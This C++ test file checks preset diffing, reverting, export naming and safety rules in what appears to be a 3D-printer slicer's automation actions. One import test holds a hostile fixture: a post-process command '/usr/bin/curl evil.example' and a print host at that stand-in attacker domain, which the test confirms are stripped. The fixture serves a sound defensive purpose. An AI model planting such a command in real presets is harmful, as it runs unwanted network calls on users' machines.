// Automation action tests. Owner: work package S7 (presets, project, files). Tag: [actions].
//
// The pure logic behind preset.diff / preset.revertKeys / preset.discardEdits / preset.save and
// file.export (Actions/PresetLogic.hpp), and the S7 descriptors: they register, validate and keep
// the safety rules (Destructive/Outward confirm natively or say why not).

#include <catch2/catch_test_macros.hpp>

#include <algorithm>
#include <set>

#include "libslic3r/PrintConfig.hpp"
#include "slic3r/GUI/Actions/ActionCatalog.hpp"
#include "slic3r/GUI/Actions/ActionRuntime.hpp"
#include "slic3r/GUI/Actions/ActionSchema.hpp"
#include "slic3r/GUI/Actions/PresetLogic.hpp"
#include "slic3r/GUI/Actions/Register.hpp"
#include "slic3r/GUI/WebAppPresetShare.hpp"

using namespace Slic3r;
using namespace Slic3r::GUI::Actions;
namespace PL = Slic3r::GUI::Actions::PresetLogic;

namespace {

DynamicPrintConfig print_config(int walls, double layer, const std::string& pattern)
{
    DynamicPrintConfig c;
    c.set_key_value("wall_loops", new ConfigOptionInt(walls));
    c.set_key_value("layer_height", new ConfigOptionFloat(layer));
    c.set_key_value("sparse_infill_pattern", new ConfigOptionEnum<InfillPattern>(pattern == "gyroid" ? ipGyroid : ipGrid));
    return c;
}

Catalog s7_catalog()
{
    Catalog c;
    register_preset_actions(c);
    register_project_actions(c);
    register_file_actions(c);
    return c;
}

} // namespace

TEST_CASE("diff_configs lists only differing keys, sorted, with both values", "[actions][presets]")
{
    const DynamicPrintConfig a = print_config(2, 0.2, "grid");
    const DynamicPrintConfig b = print_config(3, 0.2, "gyroid");
    const auto               d = PL::diff_configs(a, b);
    REQUIRE(d.size() == 2);
    CHECK(d[0].key == "sparse_infill_pattern");
    CHECK(d[1].key == "wall_loops");
    CHECK(d[1].a == "2");
    CHECK(d[1].b == "3");
    CHECK(d[1].in_a);
    CHECK(d[1].in_b);
    CHECK(PL::diff_configs(a, a).empty());
}

TEST_CASE("diff_configs reports one-sided keys and honours the visibility filter and key list", "[actions][presets]")
{
    DynamicPrintConfig a = print_config(2, 0.2, "grid");
    DynamicPrintConfig b = print_config(2, 0.2, "grid");
    b.set_key_value("print_host", new ConfigOptionString("192.0.2.1"));
    b.set_key_value("compatible_printers", new ConfigOptionStrings({"X"}));

    auto all = PL::diff_configs(a, b);
    REQUIRE(all.size() == 2);
    CHECK(all[0].key == "compatible_printers");
    CHECK_FALSE(all[0].in_a);
    CHECK(all[0].a.empty());

    // A secret never shows, whichever side holds it.
    auto visible = PL::diff_configs(a, b, [](const std::string& k) { return k != "print_host"; });
    REQUIRE(visible.size() == 1);
    CHECK(visible[0].key == "compatible_printers");

    b.set_key_value("wall_loops", new ConfigOptionInt(5));
    const std::vector<std::string> only = {"wall_loops", "no_such_key"};
    auto                           some = PL::diff_configs(a, b, {}, &only);
    REQUIRE(some.size() == 1);
    CHECK(some[0].key == "wall_loops");
}

TEST_CASE("diff_configs cuts long values", "[actions][presets]")
{
    DynamicPrintConfig a, b;
    a.set_key_value("filament_notes", new ConfigOptionStrings({std::string(5000, 'x')}));
    b.set_key_value("filament_notes", new ConfigOptionStrings({"y"}));
    auto d = PL::diff_configs(a, b, {}, nullptr, 100);
    REQUIRE(d.size() == 1);
    CHECK(d[0].a.size() == 100);
}

TEST_CASE("plan_revert sorts keys into apply, unchanged and skipped", "[actions][presets]")
{
    const DynamicPrintConfig edited    = print_config(4, 0.28, "grid");
    DynamicPrintConfig       reference = print_config(2, 0.28, "grid");
    auto writable = [](const std::string& k, std::string& why) {
        if (k == "sparse_infill_pattern") {
            why = "denied for the test";
            return false;
        }
        return true;
    };
    const auto plan = PL::plan_revert(edited, reference, {"wall_loops", "layer_height", "sparse_infill_pattern", "nozzle_diameter", "wall_loops"},
                                      writable);
    CHECK(plan.apply == std::vector<std::string>{"wall_loops"});
    CHECK(plan.unchanged == std::vector<std::string>{"layer_height"});
    REQUIRE(plan.skipped.size() == 2);
    CHECK(plan.skipped[0].first == "sparse_infill_pattern");
    CHECK(plan.skipped[0].second == "denied for the test");
    CHECK(plan.skipped[1].first == "nozzle_diameter");

    DynamicPrintConfig sparse_ref;
    const auto         missing = PL::plan_revert(edited, sparse_ref, {"wall_loops"});
    REQUIRE(missing.skipped.size() == 1);
    CHECK(missing.apply.empty());
}

TEST_CASE("plan_revert and apply_revert handle one extruder value (key#i)", "[actions][presets]")
{
    DynamicPrintConfig edited, saved;
    edited.set_key_value("retraction_length", new ConfigOptionFloats({0.8, 2.0}));
    saved.set_key_value("retraction_length", new ConfigOptionFloats({0.8, 1.0}));
    edited.set_key_value("wall_loops", new ConfigOptionInt(4));
    saved.set_key_value("wall_loops", new ConfigOptionInt(2));

    std::string base;
    size_t      index = 0;
    CHECK(PL::split_indexed_key("retraction_length#1", base, index));
    CHECK(base == "retraction_length");
    CHECK(index == 1);
    CHECK_FALSE(PL::split_indexed_key("wall_loops", base, index));
    CHECK(base == "wall_loops");
    CHECK_FALSE(PL::split_indexed_key("x#a", base, index));
    CHECK(base.empty());

    const auto plan = PL::plan_revert(edited, saved, {"retraction_length#0", "retraction_length#1", "retraction_length#7", "wall_loops#0",
                                                       "wall_loops"});
    CHECK(plan.unchanged == std::vector<std::string>{"retraction_length#0"});
    CHECK(plan.apply == std::vector<std::string>{"retraction_length#1", "wall_loops"});
    REQUIRE(plan.skipped.size() == 2); // index out of range; an index on a scalar
    CHECK(plan.skipped[0].first == "retraction_length#7");
    CHECK(plan.skipped[1].first == "wall_loops#0");

    const auto written = PL::apply_revert(edited, saved, plan.apply);
    CHECK(written == std::vector<std::string>{"retraction_length", "wall_loops"});
    CHECK(edited.option<ConfigOptionFloats>("retraction_length")->values == std::vector<double>{0.8, 1.0});
    CHECK(edited.opt_int("wall_loops") == 2);

    // Only the named element moves.
    DynamicPrintConfig both;
    both.set_key_value("retraction_length", new ConfigOptionFloats({3.0, 3.0}));
    PL::apply_revert(both, saved, {"retraction_length#0"});
    CHECK(both.option<ConfigOptionFloats>("retraction_length")->values == std::vector<double>{0.8, 3.0});
}

TEST_CASE("check_preset_name holds the Save dialog's rules", "[actions][presets]")
{
    const std::string suffix = " (modified)";
    CHECK(PL::check_preset_name("PETG-CF fast", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("", suffix).empty());
    CHECK_FALSE(PL::check_preset_name(std::string(201, 'a'), suffix).empty());
    CHECK_FALSE(PL::check_preset_name("a/b", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("what?", suffix).empty());
    CHECK_FALSE(PL::check_preset_name(" lead", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("trail ", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("PLA (modified)", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("Default Filament", suffix).empty());
    CHECK_FALSE(PL::check_preset_name("- default -", suffix).empty());
}

TEST_CASE("json_to_ini matches setSettings' conversion", "[actions][presets]")
{
    std::string out;
    const ConfigOptionDef* walls = print_config_def.get("wall_loops");
    REQUIRE(walls != nullptr);
    CHECK(PL::json_to_ini(3, *walls, out));
    CHECK(out == "3");
    CHECK(PL::json_to_ini("35%", *walls, out));
    CHECK(out == "35%");
    CHECK(PL::json_to_ini(true, *walls, out));
    CHECK(out == "1");
    CHECK_FALSE(PL::json_to_ini(nlohmann::json::object(), *walls, out));

    const ConfigOptionDef* temps = print_config_def.get("nozzle_temperature");
    REQUIRE(temps != nullptr);
    CHECK(PL::json_to_ini(nlohmann::json::array({220, 225}), *temps, out));
    CHECK(out == "220,225");
    CHECK_FALSE(PL::json_to_ini(nlohmann::json::array({nlohmann::json::array({1})}), *temps, out));

    const ConfigOptionDef* notes = print_config_def.get("filament_notes");
    REQUIRE(notes != nullptr);
    CHECK(PL::json_to_ini(nlohmann::json::array({"a;b", "c"}), *notes, out));
    std::vector<std::string> back;
    CHECK(unescape_strings_cstyle(out, back));
    CHECK(back == std::vector<std::string>{"a;b", "c"});
}

TEST_CASE("dirty_keys_all_written: only edits the turn made itself are its own", "[actions][presets]")
{
    CHECK(PL::dirty_keys_all_written({}, {}));
    CHECK(PL::dirty_keys_all_written({"wall_loops"}, {"wall_loops", "layer_height"}));
    CHECK_FALSE(PL::dirty_keys_all_written({"wall_loops", "sparse_infill_density"}, {"wall_loops"}));
}

TEST_CASE("export kinds and per-object file names", "[actions][presets]")
{
    for (const char* id : {"stl", "stls", "drc", "drcs", "3mf", "publish3mf", "toolpathsObj"})
        CHECK(PL::find_export_kind(id) != nullptr);
    CHECK(PL::find_export_kind("gcode") == nullptr);
    CHECK(PL::find_export_kind("stls")->per_object);
    CHECK(PL::find_export_kind("toolpathsObj")->needs_slice);

    std::set<std::string> taken = {"cube.stl"};
    CHECK(PL::per_object_file_name("Cube", ".stl", taken) == "Cube (1).stl");
    CHECK(PL::per_object_file_name("Cube", ".stl", taken) == "Cube (2).stl");
    CHECK(PL::per_object_file_name("a/b:c", ".stl", taken) == "a_b_c.stl");
    CHECK(PL::per_object_file_name("  . ", ".stl", taken) == "object.stl"); // trailing dots and spaces go; nothing left
    CHECK(PL::per_object_file_name("", ".drc", taken) == "object.drc");

    CHECK(PL::config_import_extension("json", false));
    CHECK_FALSE(PL::config_import_extension("json", true));
    CHECK(PL::config_import_extension("orca_bundle", true));
    CHECK_FALSE(PL::config_import_extension("exe", false));
}

TEST_CASE("bundle export and import strip print hosts and credentials from preset JSON", "[actions][presets]")
{
    // A user printer preset as PhysicalPrinterDialog leaves it: the host and its credentials saved in.
    nlohmann::json printer = {{"name", "My printer"},
                              {"inherits", "Bambu Lab X1 Carbon 0.4 nozzle"},
                              {"printer_settings_id", "My printer"},
                              {"print_host", "192.0.2.20"},
                              {"printhost_apikey", "secret-key"},
                              {"printhost_password", "hunter2"},
                              {"printhost_user", "me"},
                              {"host_type", "octoprint"},
                              {"bed_custom_texture", "/Users/me/bed.png"},
                              {"nozzle_diameter", {"0.4"}}};
    const auto removed = PL::strip_preset_json(printer, Slic3r::GUI::WebAppPresetShare::stripped_keys());
    for (const char* k : {"print_host", "printhost_apikey", "printhost_password", "printhost_user", "host_type", "bed_custom_texture"}) {
        INFO(k);
        CHECK_FALSE(printer.contains(k));
        CHECK(std::find(removed.begin(), removed.end(), k) != removed.end());
    }
    CHECK(removed.size() == 6);
    // Everything else stays, including what makes the file importable.
    CHECK(printer["name"] == "My printer");
    CHECK(printer["inherits"] == "Bambu Lab X1 Carbon 0.4 nozzle");
    CHECK(printer.contains("nozzle_diameter"));
    // Nothing to strip: nothing reported; not an object: left alone.
    nlohmann::json process = {{"name", "P"}, {"print_settings_id", "P"}, {"wall_loops", "3"}};
    CHECK(PL::strip_preset_json(process, Slic3r::GUI::WebAppPresetShare::stripped_keys()).empty());
    CHECK(process.size() == 3);
    nlohmann::json not_object = nlohmann::json::array({"print_host"});
    CHECK(PL::strip_preset_json(not_object, {"print_host"}).empty());
}

TEST_CASE("review_import_json strips what an import may not bring in and lists custom G-code", "[actions][presets]")
{
    std::vector<std::string> strip = Slic3r::GUI::WebAppPresetShare::stripped_keys();
    strip.emplace_back("post_process");
    const std::vector<std::string> code = {"machine_start_gcode", "machine_end_gcode", "filament_start_gcode"};

    nlohmann::json printer = {{"name", "Shared printer"},
                              {"printer_settings_id", "Shared printer"},
                              {"print_host", "evil.example"},
                              {"printhost_apikey", "k"},
                              {"post_process", {"/usr/bin/curl evil.example"}},
                              {"machine_start_gcode", "G28\nM500"},
                              {"machine_end_gcode", "   "}};
    const PL::ImportReview r = PL::review_import_json(printer, strip, code);
    CHECK(r.type == "printer");
    CHECK(r.name == "Shared printer");
    CHECK(std::set<std::string>(r.removed.begin(), r.removed.end()) == std::set<std::string>{"print_host", "printhost_apikey", "post_process"});
    CHECK_FALSE(printer.contains("post_process"));
    CHECK_FALSE(printer.contains("print_host"));
    CHECK(r.code_keys == std::vector<std::string>{"machine_start_gcode"}); // a blank template is not listed
    CHECK(printer.contains("machine_start_gcode"));                         // kept, shown in the confirmation

    nlohmann::json filament = {{"name", "F"}, {"filament_settings_id", {"F"}}, {"filament_start_gcode", {"", "M104 S200"}}};
    const PL::ImportReview f = PL::review_import_json(filament, strip, code);
    CHECK(f.type == "filament");
    CHECK(f.removed.empty());
    CHECK(f.code_keys == std::vector<std::string>{"filament_start_gcode"});
    CHECK(PL::preset_json_text(filament, "filament_start_gcode") == "M104 S200\n");

    nlohmann::json structure = {{"bundle_id", "x"}, {"printer_config", nlohmann::json::array()}};
    CHECK(PL::preset_json_type(structure).empty());
    CHECK(PL::review_import_json(structure, strip, code).type.empty());
    CHECK(PL::preset_json_type({{"print_settings_id", "P"}}) == "print");
}

TEST_CASE("ifDirty: five values; a switch covers the dependent presets", "[actions][presets]")
{
    for (const char* v : {"ask", "discard", "prompt", "save", "transfer"})
        CHECK(is_if_dirty_value(v));
    CHECK_FALSE(is_if_dirty_value("keep"));
    CHECK_FALSE(is_if_dirty_value(""));
    const nlohmann::json schema = if_dirty_schema();
    CHECK(schema["enum"].size() == 5);
    SchemaError err;
    CHECK(check_schema({{"type", "object"}, {"additionalProperties", false}, {"properties", {{"ifDirty", schema}}}}, err));
    CHECK(preset_switch_scope(Preset::TYPE_PRINTER) == std::vector<Preset::Type>{Preset::TYPE_PRINTER, Preset::TYPE_PRINT, Preset::TYPE_FILAMENT});
    CHECK(preset_switch_scope(Preset::TYPE_PRINT) == std::vector<Preset::Type>{Preset::TYPE_PRINT, Preset::TYPE_FILAMENT});
    CHECK(preset_switch_scope(Preset::TYPE_FILAMENT) == std::vector<Preset::Type>{Preset::TYPE_FILAMENT});
}

TEST_CASE("S7 descriptors register and keep the safety rules", "[actions][presets]")
{
    Catalog c;
    REQUIRE_NOTHROW(c = s7_catalog());
    for (const char* id : {"preset.save", "preset.rename", "preset.delete", "preset.diff", "preset.revertKeys", "preset.discardEdits",
                           "preset.setVisible", "preset.createFromTemplate", "preset.exportBundle", "preset.importBundle",
                           "preset.importConfig", "printer.listPhysical", "project.new", "project.save", "project.saveAs", "project.info",
                           "project.openRecent", "project.importModel", "file.export", "file.reloadGcode", "preset.setCompatibility",
                           "preset.transfer", "settings.copyExtruder", "printer.setExtruderCount", "bed.setShape", "settings.setFileFromUrl",
                           "preset.listBundles", "preset.deleteBundle", "preset.createFilament", "preset.createPrinter"}) {
        INFO(id);
        const ActionEntry* e = c.find(id);
        REQUIRE(e != nullptr);
        CHECK(e->runner);
        CHECK_FALSE(e->descriptor.examples.empty());
        const Risk r = e->descriptor.risk;
        if (r == Risk::Destructive || r == Risk::OutwardFile || r == Risk::OutwardNetwork)
            CHECK((e->descriptor.confirm == Confirm::Native || !e->descriptor.confirm_skip_rule.empty()));
    }
    // The vendor-catalog methods are described by ExistingMethods, not here.
    for (const char* method : {"slicer.addFilamentSlot", "slicer.saveFilamentPreset", "slicer.listPrinterModels", "slicer.addPrinter"})
        CHECK(c.find_by_method(method) == nullptr);
    CHECK(c.find("preset.deleteBundle")->descriptor.confirm == Confirm::Native);
    CHECK(c.find("bed.setShape")->descriptor.long_running);
    CHECK(c.find("settings.setFileFromUrl")->descriptor.long_running);
    CHECK(c.find("preset.delete")->descriptor.params["properties"].contains("cascade"));
    CHECK(c.find("preset.importConfig")->descriptor.params["properties"]["installVendors"]["default"] == false);
    CHECK(c.find("preset.exportBundle")->descriptor.params["properties"]["format"]["default"] == "zip");
    CHECK(c.find("preset.delete")->descriptor.confirm == Confirm::Native);
    CHECK(c.find("preset.exportBundle")->descriptor.gate == Gate::Export);
    CHECK(c.find("file.export")->descriptor.gate == Gate::Export);
    CHECK(c.find("preset.importBundle")->descriptor.gate == Gate::Install);
    CHECK(c.find("preset.importBundle")->descriptor.long_running);
}

TEST_CASE("vendor-catalog typed methods are described once, by ExistingMethods", "[actions][presets]")
{
    Catalog c;
    register_existing_methods(c);
    REQUIRE_NOTHROW(register_preset_actions(c));
    CHECK(c.find("preset.saveFilament") == nullptr); // the method is filament.savePreset
    const ActionEntry* save = c.find("filament.savePreset");
    REQUIRE(save != nullptr);
    CHECK(save->descriptor.params["properties"]["slot"]["maximum"] == 63);
    CHECK(save->descriptor.params["required"] == nlohmann::json::array({"name"}));
    const ActionEntry* add = c.find("printer.add");
    REQUIRE(add != nullptr);
    CHECK(add->descriptor.params["required"] == nlohmann::json::array({"model"}));
    CHECK(std::set<std::string>(add->descriptor.effects.begin(), add->descriptor.effects.end()) ==
          std::set<std::string>{"presets", "settings"});
    CHECK(add->descriptor.params["properties"]["nozzle"]["maxLength"] == 20);
    const ActionEntry* select = c.find("preset.select");
    REQUIRE(select != nullptr);
    CHECK(select->descriptor.params["properties"].contains("allowHidden"));
    for (const char* id : {"preset.select", "settings.set", "filament.savePreset", "printer.add"}) {
        INFO(id);
        const nlohmann::json values = c.find(id)->descriptor.params["properties"]["ifDirty"]["enum"];
        CHECK(values == nlohmann::json::array({"ask", "discard", "prompt", "save", "transfer"}));
    }
}

TEST_CASE("S7 examples validate against their own schemas", "[actions][presets]")
{
    const Catalog c = s7_catalog();
    for (const ActionEntry& e : c.entries()) {
        INFO(e.descriptor.id);
        for (const nlohmann::json& ex : e.descriptor.examples) {
            SchemaError err;
            const nlohmann::json params = ex.contains("params") ? ex["params"] : nlohmann::json::object();
            CHECK(validate(e.descriptor.params, apply_defaults(e.descriptor.params, params), err));
        }
        // An unknown parameter is refused by every S7 schema (additionalProperties:false).
        SchemaError err;
        CHECK_FALSE(validate(e.descriptor.params, {{"notAParam", 1}}, err));
    }
}
